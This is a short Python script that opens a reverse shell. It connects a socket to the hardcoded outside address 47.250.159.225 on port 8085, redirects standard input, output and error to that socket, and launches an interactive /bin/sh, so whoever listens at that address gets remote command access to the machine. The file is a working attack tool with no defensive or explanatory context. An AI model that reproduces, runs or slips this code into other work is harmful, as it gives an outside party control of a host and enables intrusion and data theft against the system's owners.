import socket
import subprocess
import os

def reverse_shell(ip, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to the specified IP address and port
    s.connect((ip, port))
    
    # Redirect standard input, output, and error to the socket
    os.dup2(s.fileno(), 0)  # Standard input
    os.dup2(s.fileno(), 1)  # Standard output
    os.dup2(s.fileno(), 2)  # Standard error
    
    # Start a shell
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    # Replace 'your_ip' and 'your_port' with the IP and port you want to connect to
    reverse_shell('47.250.159.225', 8085)
